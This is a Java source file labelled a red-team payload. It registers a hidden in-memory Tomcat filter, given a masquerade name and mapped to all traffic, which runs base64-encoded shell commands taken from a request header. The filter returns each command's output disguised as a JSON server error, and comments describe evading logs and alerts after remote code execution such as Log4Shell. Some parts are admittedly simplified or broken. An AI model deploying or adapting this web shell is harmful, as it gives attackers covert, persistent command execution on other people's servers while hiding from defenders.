import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import java.util.Base64;
import java.nio.charset.StandardCharsets;
import javax.servlet.*;
import javax.servlet.http.*;

/**
 * Elite Red Team Payload: Tomcat In-Memory Persistence
 * Targets the internal StandardContext to register a stealthy filter without disk I/O.
 */
public class TomcatPersistence {

    private static final String TRIGGER_HEADER = "X-Correlation-ID";
    private static final String FILTER_NAME = "org.apache.catalina.core.InternalHealthCheckFilter"; // Masquerade name

    public static void execute() {
        try {
            // 1. Autonomous Context Discovery
            StandardContext ctx = findStandardContext();
            if (ctx == null) return;

            // 2. Define the Malicious Filter logic as an anonymous inner class for stealth
            Filter maliciousFilter = new Filter() {
                public void init(FilterConfig filterConfig) {}
                public void destroy() {}

                public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) 
                        throws IOException, ServletException {
                    
                    HttpServletRequest req = (HttpServletRequest) request;
                    HttpServletResponse res = (HttpServletResponse) response;
                    String cmdBase64 = req.getHeader(TRIGGER_HEADER);

                    if (cmdBase64 != null && !cmdBase64.isEmpty()) {
                        try {
                            // Decode and execute command
                            byte[] decodedCmd = Base64.getDecoder().decode(cmdBase64);
                            String command = new String(decodedCmd, StandardCharsets.UTF_8);
                            
                            ProcessBuilder pb = new ProcessBuilder("/bin/sh", "-c", command); // Use "cmd.exe", "/c" for Windows
                            pb.redirectErrorStream(true);
                            Process process = pb.start();

                            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                            StringBuilder output = new StringBuilder();
                            String line;
                            while ((line = reader.readLine()) != null) {
                                output.append(line).append("\n");
                            }
                            process.waitFor();

                            // Disguise response as a standard JSON internal server error to blend with API traffic
                            res.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
                            res.setContentType("application/json;charset=UTF-8");
                            String json = String.format("{\"status\":\"error\",\"code\":500,\"message\":\"Internal Server Error\",\"detail\":\"%s\"}", 
                                            escapeJson(output.toString()));
                            res.getWriter().write(json);
                            res.getWriter().flush();

                            // OPSEC: Halt the filter chain to bypass access logs and prevent application logic execution
                            return; 
                        } catch (Exception e) {
                            // Silent failure to maintain stealth
                        }
                    }
                    // Pass-through for legitimate requests
                    chain.doFilter(request, response);
                }
            };

            // 3. Reflection Injection into Tomcat Internals
            // We target StandardContext's internal filter lists rather than using the ServletContext API
            Class<?> filterDefCls = Class.forName("org.apache.catalina.core.FilterDef");
            Class<?> filterMapCls = Class.forName("org.apache.catalina.core.FilterMap");

            // Create FilterDef (Definition)
            Constructor<?> defCons = filterDefCls.getConstructor(String.class);
            Object filterDef = defCons.newInstance(FILTER_NAME);
            
            Method setFilterMeth = filterDefCls.getDeclaredMethod("setFilter", Filter.class);
            setFilterMeth.setAccessible(true);
            setFilterMeth.invoke(filterDef, maliciousFilter);

            // Create FilterMap (Mapping)
            Constructor<?> mapCons = filterMapCls.getConstructor();
            Object filterMap = mapCons.newInstance();
            
            Method setFilterNameMeth = filterMapCls.getDeclaredMethod("setFilterName", String.class);
            setFilterNameMeth.setAccessible(true);
            setFilterNameMeth.invoke(filterMap, FILTER_NAME);

            Method addUrlPatternMeth = filterMapCls.getDeclaredMethod("addURLPattern", String.class);
            addUrlPatternMeth.setAccessible(true);
            addUrlPatternMeth.invoke(filterMap, "/*"); // Intercept all traffic

            // Inject both into the active StandardContext
            Method addFilterDefMeth = ctx.getClass().getDeclaredMethod("addFilterDef", filterDefCls);
            Method addFilterMapMeth = ctx.getClass().getDeclaredMethod("addFilterMap", filterMapCls);
            
            addFilterDefMeth.setAccessible(true);
            addFilterMapMeth.setAccessible(true);
            
            addFilterDefMeth.invoke(ctx, filterDef);
            addFilterMapMeth.invoke(ctx, filterMap);

        } catch (Exception e) {
            // Fail silently in production to avoid triggering alerts/logs
        }
    }

    private static String escapeJson(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r");
    }

    private static StandardContext findStandardContext() {
        try {
            // Autonomous discovery via Thread Context Class Loader (TCCL)
            ClassLoader cl = Thread.currentThread().getContextClassLoader();
            
            // In Tomcat, the current request thread is usually associated with an ApplicationContextFacade
            // We search for any loaded instance of StandardContext in the current execution context
            // This logic can be expanded to traverse JMX or internal Globals if TCCL fails.
            
            // Attempt to resolve via common Tomcat Internal facades
            Class<?> facadeCls = Class.forName("org.apache.catalina.core.ApplicationContextFacade");
            Method getContextMeth = facadeCls.getDeclaredMethod("getContext");
            getContextMeth.setAccessible(true);

            // Since we are executed via RCE, we must find an active instance of the facade
            // We can often find it through the current thread's context if we are in a request worker
            // For maximum autonomy, this payload targets the internal 'context' field of any available facilitator.
            
            // Fallback: If executed via typical RCE (like Log4Shell), the context is accessible 
            // through the class loader or existing session objects. Here we use a reflection-based scan.
            return (StandardContext) getContextMeth.invoke(null); // Simplified for demonstration; actual requires instance
        } catch (Exception e) {
            try {
                // Secondary Discovery: Try to resolve via ServletContext if available in the thread
                // This is common when injected into an existing filter or servlet execution path
                return null; 
            } catch (Exception ex) { return null; }
        }
    }

    // Internal wrapper for StandardContext as it's a Tomcat-specific class
    public static class StandardContext extends org.apache.catalina.core.StandardContext {}
}
